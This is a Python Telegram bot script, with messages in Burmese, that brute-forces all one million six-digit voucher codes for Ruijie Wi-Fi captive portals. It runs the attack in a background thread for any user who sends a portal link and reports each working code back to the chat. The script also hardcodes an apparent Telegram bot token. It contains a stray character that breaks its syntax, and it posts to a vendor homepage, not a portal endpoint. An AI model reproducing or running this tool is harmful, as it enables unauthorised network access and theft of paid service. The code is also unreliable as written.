import telebot
import requests
import threading
import time

BOT_TOKEN = "8953132746:AAE51eLwuscQZMA-64tKE8MJ95uyqzNH-O8"
bot = telebot.TeleBot(BOT_TOKEN)

scanning_status = {}j

def brute_force_ruijie(chat_id, portal_url):
    scanning_status[chat_id] = True
    bot.send_message(chat_id, "⏳ Ruijie Wi-Fi ကို Background Server ပေါ်မှာ စတင် Scan ဖတ်နေပါပြီ...")
    success_hits = []
    checked_count = 0

    for code_num in range(0, 1000000):
        if not scanning_status.get(chat_id, False):
            break
            
        voucher_code = f"{code_num:06d}"
        checked_count += 1

        try:
            payload = {"voucher": voucher_code, "url": portal_url}
            response = requests.post("https://ruijienetworks.com", json=payload, timeout=5)
            
            if response.status_code == 200 and "success" in response.text.lower():
                success_hits.append(voucher_code)
                bot.send_message(chat_id, f"✅ ကုဒ်အသစ် ရှာတွေ့ပါသည်: {voucher_code}")
        except Exception:
            pass

        if checked_count % 10000 == 0:
            bot.send_message(chat_id, f"🔍 Scanning...\nChecked: {checked_count:,}/1,000,000\nSuccess hits: {len(success_hits)}")

    bot.send_message(chat_id, f"🏁 Scanning ပြီးဆုံးပါပြီ။\nရှာတွေ့သမျှ ကုဒ်များ: {success_hits}")

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, "👋 မင်္ဂလာပါ။ Ruijie Wi-Fi Portal Link ကို ပို့ပေးရင် Voucher Code များကို Server ပေါ်တွင် ၂၄ နာရီပတ်လုံး အလိုအလျောက် ရှာဖွေပေးပါမည်။")

@bot.message_handler(commands=['stop'])
def stop_scan(message):
    scanning_status[message.chat.id] = False
    bot.reply_to(message, "🛑 Scanning လုပ်ငန်းစဉ်ကို ရပ်ဆိုင်းလိုက်ပါပြီ။")

@bot.message_handler(func=lambda message: "portal" in message.text.lower() or "http" in message.text.lower())
def handle_link(message):
    portal_url = message.text
    threading.Thread(target=brute_force_ruijie, args=(message.chat.id, portal_url)).start()

print("Bot is running...")
bot.infinity_polling()
